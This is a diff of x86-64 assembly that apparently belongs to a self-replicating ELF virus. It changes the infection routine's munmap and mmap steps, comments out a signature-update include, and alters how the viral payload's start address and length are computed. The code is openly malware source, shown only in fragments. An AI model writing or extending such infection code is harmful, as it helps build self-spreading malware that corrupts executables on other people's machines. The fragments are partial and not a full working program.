@@ -201,12 +201,17 @@
 	cmp rax, [rsi]
 	jbe .no_extendinfection
 
+
+
+
 	mov rax, SYS_munmap
 	mov rdi, r14
 	mov		rsi, [rbp + 16]
-	add		rsi, mydata.p_vaddr
+	add		rsi, mydata.file_size
 	mov rsi, [rsi]
 	syscall
+
+
 
 	mov rdi, r12
 	mov		rsi, [rbp + 16]
@@ -238,6 +243,9 @@
 
 	%include "functions/updata_signature.s"
 	;call update_signature
+
+
+
 
 	;	le mmap de death
 	mov rax, SYS_mmap
@@ -283,10 +291,15 @@
 
 	mov		r10, 10
 
+	mov		rdx, [rbp + 16]
+	;lea rdx, [rel _stop]
 
 	lea		rdi, [rel _stop]
 
-	lea		rax, [rel _start]
+	mov		rax, [rbp + 8]
+	;lea rcx, [rel _start]
+
+	;lea		rax, [rel _start]
 
 	sub		rdi, rax
 
